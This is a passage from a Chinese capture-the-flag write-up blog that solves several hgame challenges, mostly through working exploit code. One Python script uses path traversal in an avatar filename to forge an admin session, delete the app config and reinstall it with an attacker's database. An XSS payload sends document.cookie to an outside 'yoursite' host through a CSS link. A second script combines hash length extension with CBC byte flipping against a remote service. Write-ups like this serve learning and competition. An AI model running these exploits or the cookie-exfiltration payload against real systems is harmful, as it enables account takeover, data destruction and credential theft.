</span></span></code></pre></div><p>这里 Filename 没有过滤就直接拼接上去, 导致可以任意文件上传,<br>将位置设到 session 保存的目录底下, 就可以伪造 session 拿到管理员权限. (不了解的同学可以去了解一下 gogs 的 RCE)<br>PS. 这里直接覆盖 app.conf 没有用&mldr; 估计服务端的源码另外修改过</p><p>而且管理员在删除用户时会直接删掉这个头像文件,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>if user.Avatar != &#34;/static/img/avatar.jpg&#34; {
</span></span><span style=display:flex><span>    fmt.Println(user.Avatar)
</span></span><span style=display:flex><span>    err := os.Remove(user.Avatar[1:])
</span></span><span style=display:flex><span>    fmt.Println(err)
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这里我的方法是再建一个用户, 将头像设成 app.conf 所在路径, 用管理员权限的 session 删掉这个用户, 这时配置文件将会被删除.<br>再去访问 <code>/install</code>, 就可以把我们的配置文件写进去了.</p><p>因为 5min 就重置一次, 我就写了个脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>SERVER <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;http://94.191.10.201:7000&#34;</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># http://94.191.10.201:7000</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># http://127.0.0.1:9999</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> string
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> random
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> bs4
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>register</span>(username, password):
</span></span><span style=display:flex><span>    sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>    sess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/auth&#34;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#34;username&#34;</span>: username,
</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#34;password&#34;</span>: password,
</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#34;confirmpass&#34;</span>: password,
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/auth/register&#34;</span>, data<span style=color:#ff79c6>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>login</span>(sess, username, password):
</span></span><span style=display:flex><span>    sess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/auth&#34;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#34;username&#34;</span>: username,
</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#34;password&#34;</span>: password,
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/auth/login&#34;</span>, data<span style=color:#ff79c6>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>adminUsername <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(random<span style=color:#ff79c6>.</span>choices(string<span style=color:#ff79c6>.</span>ascii_letters, k<span style=color:#ff79c6>=</span><span style=color:#bd93f9>10</span>))
</span></span><span style=display:flex><span>adminPassword <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;rmb1222&#34;</span>
</span></span><span style=display:flex><span>adminSess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>register(adminUsername, adminPassword)
</span></span><span style=display:flex><span>login(adminSess, adminUsername, adminPassword)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sessPath <span style=color:#ff79c6>=</span> adminSess<span style=color:#ff79c6>.</span>cookies[<span style=color:#f1fa8c>&#34;PHPSESSID&#34;</span>]
</span></span><span style=display:flex><span>newAvatar <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;../../tmp/</span><span style=color:#f1fa8c>{</span>sessPath[<span style=color:#bd93f9>0</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/</span><span style=color:#f1fa8c>{</span>sessPath[<span style=color:#bd93f9>1</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/</span><span style=color:#f1fa8c>{</span>sessPath[<span style=color:#bd93f9>0</span>:<span style=color:#bd93f9>3</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>cb478171476a1dbcec5ffdef658c4&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>file <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#39;uploadname&#39;</span>: (newAvatar, <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;test.png&#39;</span>, <span style=color:#f1fa8c>&#39;rb&#39;</span>))}
</span></span><span style=display:flex><span>adminSess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/userinfo&#34;</span>, files<span style=color:#ff79c6>=</span>file) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>adminSess<span style=color:#ff79c6>.</span>cookies[<span style=color:#f1fa8c>&#34;PHPSESSID&#34;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>sessPath[<span style=color:#bd93f9>0</span>:<span style=color:#bd93f9>3</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>cb478171476a1dbcec5ffdef658c4&#34;</span>  <span style=color:#6272a4># now you are admin</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(adminUsername)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(newAvatar)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># ------------</span>
</span></span><span style=display:flex><span>dummyUsername <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(random<span style=color:#ff79c6>.</span>choices(string<span style=color:#ff79c6>.</span>ascii_letters, k<span style=color:#ff79c6>=</span><span style=color:#bd93f9>10</span>))
</span></span><span style=display:flex><span>dummyPassword <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;rmb1222&#34;</span>
</span></span><span style=display:flex><span>dummySess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>register(dummyUsername, dummyPassword)
</span></span><span style=display:flex><span>login(dummySess, dummyUsername, dummyPassword)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>newAvatar <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;../../conf/app.conf&#34;</span>
</span></span><span style=display:flex><span>file <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#39;uploadname&#39;</span>: (newAvatar, <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;temp&#39;</span>, <span style=color:#f1fa8c>&#39;rb&#39;</span>))}
</span></span><span style=display:flex><span>dummySess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/userinfo&#34;</span>, files<span style=color:#ff79c6>=</span>file)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(dummyUsername)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># ------------</span>
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> adminSess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/admin&#34;</span>)
</span></span><span style=display:flex><span>reg <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>fr</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>dummyUsername<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> \(UID: ([0-9]</span><span style=color:#f1fa8c>{{</span><span style=color:#f1fa8c>0,</span><span style=color:#f1fa8c>}}</span><span style=color:#f1fa8c>)\)&#34;</span>
</span></span><span style=display:flex><span>uid <span style=color:#ff79c6>=</span> re<span style=color:#ff79c6>.</span>findall(reg, res<span style=color:#ff79c6>.</span>text)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(uid)
</span></span><span style=display:flex><span>uid <span style=color:#ff79c6>=</span> uid[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>adminSess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/admin/user/del/</span><span style=color:#f1fa8c>{</span>uid<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>) <span style=color:#6272a4># delete app.conf</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># ------------</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># ------------ overwirte it</span>
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> adminSess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/install&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
</span></span><span style=display:flex><span>data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;host&#34;</span>: <span style=color:#f1fa8c>&#34;your server ip&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;port&#34;</span>: <span style=color:#f1fa8c>&#34;port&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;username&#34;</span>: <span style=color:#f1fa8c>&#34;root&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;password&#34;</span>: <span style=color:#f1fa8c>&#34;rmb122&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;database&#34;</span>: <span style=color:#f1fa8c>&#34;123&#34;</span>,
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>adminSess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>SERVER<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/install&#34;</span>, data<span style=color:#ff79c6>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>register(<span style=color:#f1fa8c>&#34;123123123&#34;</span>, <span style=color:#f1fa8c>&#34;1231231231&#34;</span>)
</span></span></code></pre></div><p>然后就守株待兔吧 233<br><img src=https://i.loli.net/2019/03/21/5c93a61185745.png alt></p><h2 id=happyxss>HappyXss</h2><p>这个算是比较简单的了, 直接用 <code>&lt;iframe src=javascript:alert('xss');>&lt;/iframe></code> 就可以绕了<br>不过需要注意下 CSP, <code>Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src *</code><br>用 <code>&lt;img src=''></code> 的方式来拿 cookie 是不行了, 但是注意 <code>style-src *</code>,<br>可以通过 css 来拿 cookie, payload 这样</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>(<span style=color:#8be9fd;font-style:italic>function</span>(){ css<span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>document</span>.createElement(<span style=color:#f1fa8c>&#34;link&#34;</span>);css.setAttribute(<span style=color:#f1fa8c>&#34;rel&#34;</span>,<span style=color:#f1fa8c>&#34;stylesheet&#34;</span>);css.setAttribute(<span style=color:#f1fa8c>&#34;href&#34;</span>,<span style=color:#f1fa8c>&#34;yoursite?a=&#34;</span><span style=color:#ff79c6>+</span>escape(<span style=color:#8be9fd;font-style:italic>document</span>.cookie));<span style=color:#8be9fd;font-style:italic>document</span>.getElementsByTagName(<span style=color:#f1fa8c>&#34;head&#34;</span>)[<span style=color:#bd93f9>0</span>].appendChild(css);}())
</span></span></code></pre></div><h2 id=easy_rsa>easy_rsa</h2><p>共模攻击, 不过这里 e1, e2 不互质, 3 == gcd(e1, e2), 我们先把 e1, e2 都除以 3<br>然后把除以三以后的 e1, e2 丢到脚本里跑, 把结果开三次方就可以了</p><h2 id=sign_in_semihard>Sign_in_SemiHard</h2><p>哈希长度拓展 + CBC 字节翻转, 直接上脚本吧, 不多说了<br>因为时间有限所以有很多地方实现的很暴力, 233</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> hashpumpy
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> remoteCLI
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> string
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> binascii <span style=color:#ff79c6>import</span> hexlify, unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BLOCK_LENGTH <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>16</span>
</span></span><span style=display:flex><span>ZEROS <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>([<span style=color:#bd93f9>0</span> <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>)])
</span></span><span style=display:flex><span>regToken <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>r</span><span style=color:#f1fa8c>&#39;Your token is: ([0-9A-Za-z]{0,})&#39;</span>
</span></span><span style=display:flex><span>regUsername <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>r</span><span style=color:#f1fa8c>&#39;Sorry, your username\(hex\) ([0-9A-Za-z]{0,}) is inconsistent with given signature\.&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>xor</span>(a, b):
</span></span><span style=display:flex><span>    result <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#8be9fd;font-style:italic>len</span>(a)):
</span></span><span style=display:flex><span>        result<span style=color:#ff79c6>.</span>append(a[i] <span style=color:#ff79c6>^</span> b[i])
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>unprintable <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>256</span>):
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>chr</span>(i) <span style=color:#ff79c6>not</span> <span style=color:#ff79c6>in</span> string<span style=color:#ff79c6>.</span>printable:
</span></span><span style=display:flex><span>        unprintable <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>bytes</span>([i])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cli <span style=color:#ff79c6>=</span> remoteCLI<span style=color:#ff79c6>.</span>CLI()
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>connect(<span style=color:#f1fa8c>&#34;47.95.212.185&#34;</span>, <span style=color:#bd93f9>38611</span>)
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x00\x00</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> cli<span style=color:#ff79c6>.</span>recvUntilFind(regToken)[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> unhexlify(token)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sig <span style=color:#ff79c6>=</span> token[<span style=color:#ff79c6>-</span>BLOCK_LENGTH:]
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> hashpumpy<span style=color:#ff79c6>.</span>hashpump(hexlify(sig), <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x00\x00</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;admin&#39;</span>, <span style=color:#bd93f9>16</span>)
</span></span><span style=display:flex><span><span style=color:#ff79c6>assert</span> res[<span style=color:#bd93f9>1</span>]<span style=color:#ff79c6>.</span>strip(unprintable) <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;admin&#39;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(res)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>newSig <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(unhexlify(res[<span style=color:#bd93f9>0</span>]))
</span></span><span style=display:flex><span>newPt <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(res[<span style=color:#bd93f9>1</span>])
</span></span><span style=display:flex><span>newPt[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(<span style=color:#f1fa8c>&#39;e&#39;</span>)  <span style=color:#6272a4># change last byte to e</span>
</span></span><span style=display:flex><span>offset <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>len</span>(newPt) <span style=color:#ff79c6>%</span> BLOCK_LENGTH <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>padLen <span style=color:#ff79c6>=</span> BLOCK_LENGTH <span style=color:#ff79c6>-</span> <span style=color:#8be9fd;font-style:italic>len</span>(newPt) <span style=color:#ff79c6>%</span> BLOCK_LENGTH
</span></span><span style=display:flex><span>newPt <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>([padLen]) <span style=color:#ff79c6>*</span> padLen
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(newPt)
</span></span><span style=display:flex><span><span style=color:#ff79c6>assert</span> <span style=color:#8be9fd;font-style:italic>len</span>(newPt) <span style=color:#ff79c6>//</span> BLOCK_LENGTH <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>4</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b1st <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>b2nd <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>b3rd <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>b4th <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>midVal <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(newPt[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH:]))  <span style=color:#6272a4># encrypt last two block</span>
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> cli<span style=color:#ff79c6>.</span>recvUntilFind(regToken)[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> unhexlify(token)
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(token)
</span></span><span style=display:flex><span>iv <span style=color:#ff79c6>=</span> token[:BLOCK_LENGTH]
</span></span><span style=display:flex><span>cipher <span style=color:#ff79c6>=</span> token[BLOCK_LENGTH:<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH]  <span style=color:#6272a4># get the encrypted block and drop the padding</span>
</span></span><span style=display:flex><span>cipher[offset] <span style=color:#ff79c6>^=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(<span style=color:#f1fa8c>&#34;e&#34;</span>)  <span style=color:#6272a4># flip the byte, admie -&gt; admin</span>
</span></span><span style=display:flex><span>cipher[offset] <span style=color:#ff79c6>^=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(<span style=color:#f1fa8c>&#34;n&#34;</span>)
</span></span><span style=display:flex><span>b4th <span style=color:#ff79c6>=</span> cipher[BLOCK_LENGTH:]  <span style=color:#6272a4># the last block is the final block</span>
</span></span><span style=display:flex><span>b3rd <span style=color:#ff79c6>=</span> cipher[:BLOCK_LENGTH]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(ZEROS <span style=color:#ff79c6>+</span> cipher <span style=color:#ff79c6>+</span> ZEROS))
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> cli<span style=color:#ff79c6>.</span>recvUntilFind(regUsername)[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(unhexlify(token))
</span></span><span style=display:flex><span><span style=color:#ff79c6>assert</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;admin&#39;</span> <span style=color:#ff79c6>in</span> token
</span></span><span style=display:flex><span>midVal <span style=color:#ff79c6>=</span> token[:BLOCK_LENGTH]  <span style=color:#6272a4># the mid val of 3rd block</span>
</span></span><span style=display:flex><span>b2nd <span style=color:#ff79c6>=</span> xor(midVal, newPt[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH:<span style=color:#ff79c6>-</span>BLOCK_LENGTH])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;2&#34;</span>)  <span style=color:#6272a4># decrypt 2nd to get mid val</span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(ZEROS <span style=color:#ff79c6>+</span> b2nd <span style=color:#ff79c6>+</span> b3rd <span style=color:#ff79c6>+</span> b4th <span style=color:#ff79c6>+</span> ZEROS))
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> cli<span style=color:#ff79c6>.</span>recvUntilFind(regUsername)[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> unhexlify(token)
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(token)
</span></span><span style=display:flex><span>midVal <span style=color:#ff79c6>=</span> token[:BLOCK_LENGTH]  <span style=color:#6272a4># get the mid val of 2nd block</span>
</span></span><span style=display:flex><span>b1nd <span style=color:#ff79c6>=</span> xor(midVal, newPt[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>3</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH:<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;2&#34;</span>)  <span style=color:#6272a4># decrypt 1nd to get mid val</span>
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(ZEROS <span style=color:#ff79c6>+</span> b1nd <span style=color:#ff79c6>+</span> b2nd <span style=color:#ff79c6>+</span> b3rd <span style=color:#ff79c6>+</span> b4th <span style=color:#ff79c6>+</span> ZEROS))
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> cli<span style=color:#ff79c6>.</span>recvUntilFind(regUsername)[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> unhexlify(token)
</span></span><span style=display:flex><span>token <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(token)
</span></span><span style=display:flex><span>midVal <span style=color:#ff79c6>=</span> token[:BLOCK_LENGTH]  <span style=color:#6272a4># get the mid val of 1nd block</span>
</span></span><span style=display:flex><span>iv <span style=color:#ff79c6>=</span> xor(midVal, newPt[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>4</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH:<span style=color:#ff79c6>-</span><span style=color:#bd93f9>3</span> <span style=color:#ff79c6>*</span> BLOCK_LENGTH])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(hexlify(iv <span style=color:#ff79c6>+</span> b1nd <span style=color:#ff79c6>+</span> b2nd <span style=color:#ff79c6>+</span> b3rd <span style=color:#ff79c6>+</span> b4th <span style=color:#ff79c6>+</span> newSig))
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(<span style=color:#f1fa8c>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>sendLine(hexlify(iv <span style=color:#ff79c6>+</span> b1nd <span style=color:#ff79c6>+</span> b2nd <span style=color:#ff79c6>+</span> b3rd <span style=color:#ff79c6>+</span> b4th <span style=color:#ff79c6>+</span> newSig))
</span></span><span style=display:flex><span>cli<span style=color:#ff79c6>.</span>console()
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hgame>hgame</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>